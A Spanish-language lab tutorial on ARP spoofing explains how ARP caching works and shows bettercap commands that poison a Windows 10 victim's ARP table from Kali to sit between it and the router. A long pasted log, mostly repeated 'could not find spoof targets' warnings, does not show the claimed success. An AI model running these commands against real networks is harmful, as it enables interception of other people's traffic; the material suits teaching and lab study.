# ARP Spoofing

Cuando nosotros sabemos la IP de un `nodo` ya sea en nuestra red o en una red diferente, pero no su direccion fisica (`MAC`), nosotros utilizamos el protocolo `ARP`, de manera que mandamos un paquetito a todos los `nodos` de la red preguntandoles por _quien tiene esta direccion IP y cual es tu direccion fisica_ y ese `nodo` nos responde _yo tengo esa direccion IP y esta es mi direccion fisica_, yo cojo esa informacion y la guardo en una `cache` en una tabla dentro de mi sistema operativo de manera que si tengo que volver a mandarle informacion a esa misma direccion IP, no tengo que volver a preguntarle por que ya la tendriamos almacenada.

La cosa es que este proceso no tiene por asi decirlo una autenticacion y nosotros como atacantes le podemos decir al `Router` que nosotros somos esa direccion IP y le damos nuestra direccion fisica todo de forma falsa, aqui en este `ARP Replay` podremos falsificar todo esto.

Estas pruebas las vamos hacer contra una maquina `Windows 10` en nuestro laboratorio de forma controlada.

Si nosotros miramos que tabla `ARP` tenemos en `Windows` veremos lo siguiente:

```powershell
arp -a
```

<figure><img src="../../.gitbook/assets/image (121) (1).png" alt=""><figcaption></figcaption></figure>

Esta es nuestra tabla actual de `ARP`.

Para nosotros diferenciar cual es el `Router` virtual que esta creando `VMWare` y cual es el `Router` fisico nuestro, podremos hacerlo de la siguiente forma:

```powershell
tracert www.google.com
```

Info:

```
 1     1 ms    <1 ms    <1 ms  192.168.5.2
 2     1 ms     1 ms     1 ms  192.168.0.1
```

Por lo que podemos deducir que `192.168.5.2` es el `Router` virtual y `192.168.0.1` es el `Router` fisico.

Por ejemplo, si hacemos un ping a la maquina atacante desde la maquina victima, esta hara la resolucion `ARP` y se gurdara en esa tabla que vimos anteriormente:

```powershell
ping 192.168.5.178
```

<figure><img src="../../.gitbook/assets/image (122) (1).png" alt=""><figcaption></figcaption></figure>

Ahora como podremos ver esta añadida nuestra maquina atacante en la `cache ARP` de la maquina victima, a parte de que podremos ver la direccion fisica de la maquina.

Ahora la tecnica de `ARP Spoofing` consiste en asociar esa direccion `MAC` de la maquina atacante a la direccion `MAC` del `Router`, de manera que cuando este maquina quiera hacer una peticion por ejemplo a `google` piense que esta realizandola al `Router` pero en realidad nos la esta realizando a nosotros y nosotros se la reenviamos a `google`, `google` nos manda la peticion a nosotros y nosotros se la reenviamos a la maquina victima, para que se piense que esta estableciendo una comunicacion legitima cuando no es asi.

Para realizar esto, nos iremos a nuestra maquina atacante (`kali`) y abriremos `bettercap`:

```shell
bettercap
```

Una vez dentro pondremos lo siguiente:

```shell
set arp.spoof.targets 192.168.5.181
```

Metemos la IP de la maquina victima `windows`, y dandole a `ENTER` lo estableceremos correctamente.

Y ahora para iniciar esta tecnica, tendremos que hacer lo siguiente:

```shell
arp.spoof on
```

Con esto empezara el ataque, espameando paquetes `ARP` para que parezca que somos el `Router`.

Si ahora en la maquina `windows` ponemos el `arp -a` podremos ver que el `Router` tiene la misma direccion fisica que nuestra maquina `kali`:

<figure><img src="../../.gitbook/assets/image (123) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que ya habriamos envenenado la tabla `ARP` y todas las peticiones pasan por nosotros.

Info:

```
192.168.5.0/24 > 192.168.5.178  » [07:36:13] [sys.log] [inf] arp.spoof starting net.recon as a requirement for arp.spoof
192.168.5.0/24 > 192.168.5.178  » [07:36:13] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
192.168.5.0/24 > 192.168.5.178  » [07:40:31] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:32] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:33] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:34] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:35] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:35] [sys.log] [err] error getting ipv4 gateway: Could not find mac for 192.168.5.2
192.168.5.0/24 > 192.168.5.178  » [07:40:36] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:37] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:38] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:39] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:40] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:40] [sys.log] [err] error getting ipv4 gateway: Could not find mac for 192.168.5.2
192.168.5.0/24 > 192.168.5.178  » [07:40:40] [endpoint.lost] endpoint 192.168.5.254 00:50:56:f4:94:43 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:40:41] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:42] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:43] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:44] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:45] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:45] [sys.log] [err] error getting ipv4 gateway: Could not find mac for 192.168.5.2
192.168.5.0/24 > 192.168.5.178  » [07:40:46] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:47] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:48] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:49] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:50] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:50] [sys.log] [err] error getting ipv4 gateway: Could not find mac for 192.168.5.2
192.168.5.0/24 > 192.168.5.178  » [07:40:51] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:52] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:53] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:54] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:55] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:55] [sys.log] [err] error getting ipv4 gateway: Could not find mac for 192.168.5.2
192.168.5.0/24 > 192.168.5.178  » [07:40:56] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:57] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:58] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:40:59] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:00] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:00] [sys.log] [err] error getting ipv4 gateway: Could not find mac for 192.168.5.2
192.168.5.0/24 > 192.168.5.178  » [07:41:01] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:02] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:03] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:03] [endpoint.new] endpoint 192.168.5.254 detected as 00:50:56:f4:94:43 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:41:04] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:05] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:05] [gateway.change] IPv4 gateway changed: '' () -> '192.168.5.2' (00:50:56:f5:72:77)
192.168.5.0/24 > 192.168.5.178  » [07:41:06] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:07] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:08] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:09] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:10] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:11] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:12] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:13] [endpoint.lost] endpoint 192.168.5.254 00:50:56:f4:94:43 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:41:13] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:14] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:15] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:16] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:17] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:18] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:19] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:20] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:21] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:22] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:23] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:24] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:25] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:26] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:27] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:28] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:29] [endpoint.lost] endpoint 192.168.5.181 (DESKTOP-EALA4JN.local) 00:0c:29:ba:ba:69 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:41:29] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:30] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:31] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:32] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:33] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:34] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:35] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:36] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:37] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:38] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:39] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:40] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:41] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:42] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:43] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:43] [endpoint.lost] endpoint 192.168.5.1 (MSI.local) 00:50:56:c0:00:08 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:41:44] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:45] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:45] [endpoint.new] endpoint 192.168.5.1 detected as 00:50:56:c0:00:08 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:41:46] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:47] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:48] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:49] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:50] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:51] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:52] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:53] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:53] [endpoint.new] endpoint 192.168.5.181 detected as 00:0c:29:ba:ba:69 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:41:54] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:55] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:56] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:57] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:58] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:41:59] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:00] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:01] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:02] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:03] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:04] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:05] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:06] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:07] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:08] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:09] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:10] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:10] [endpoint.lost] endpoint 192.168.5.1 (MSI.local) 00:50:56:c0:00:08 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:42:10] [endpoint.lost] endpoint 192.168.5.181 00:0c:29:ba:ba:69 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:42:11] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:11] [endpoint.new] endpoint 192.168.5.1 detected as 00:50:56:c0:00:08 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:42:12] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:13] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:13] [endpoint.new] endpoint 192.168.5.181 detected as 00:0c:29:ba:ba:69 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:42:14] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:15] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:16] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:17] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:18] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:19] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:20] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:21] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:22] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:23] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:23] [endpoint.lost] endpoint 192.168.5.181 00:0c:29:ba:ba:69 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:42:24] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:24] [endpoint.lost] endpoint 192.168.5.1 00:50:56:c0:00:08 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:42:25] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:25] [endpoint.new] endpoint 192.168.5.181 detected as 00:0c:29:ba:ba:69 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:42:25] [endpoint.new] endpoint 192.168.5.1 detected as 00:50:56:c0:00:08 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:42:26] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:27] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:28] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:29] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:30] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:31] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:32] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:33] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:34] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:35] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:36] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:36] [endpoint.lost] endpoint 192.168.5.181 00:0c:29:ba:ba:69 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:42:37] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:38] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:39] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:40] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:41] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:41] [endpoint.lost] endpoint 192.168.5.1 00:50:56:c0:00:08 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:42:41] [endpoint.new] endpoint 192.168.5.1 detected as 00:50:56:c0:00:08 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:42:42] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:43] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:44] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:45] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:46] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:47] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:48] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:48] [endpoint.new] endpoint 192.168.5.181 detected as 00:0c:29:ba:ba:69 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:42:49] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:50] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:51] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:52] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:53] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:54] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:54] [endpoint.lost] endpoint 192.168.5.1 00:50:56:c0:00:08 (VMware, Inc.) lost.
192.168.5.0/24 > 192.168.5.178  » [07:42:55] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:55] [endpoint.new] endpoint 192.168.5.1 detected as 00:50:56:c0:00:08 (VMware, Inc.).
192.168.5.0/24 > 192.168.5.178  » [07:42:56] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:57] [sys.log] [war] arp.spoof could not find spoof targets
192.168.5.0/24 > 192.168.5.178  » [07:42:58] [sys.log] [war] arp.spoof could not find spoof targets
```

Si nosotros buscamos algo en internet, lo que va a pasar es que nos va a mostrar las busquedas pero entre medias nosotros estamos viendo lo que el `windows` esta buscando estando asi de intermediario como si fueramos el `Router`.
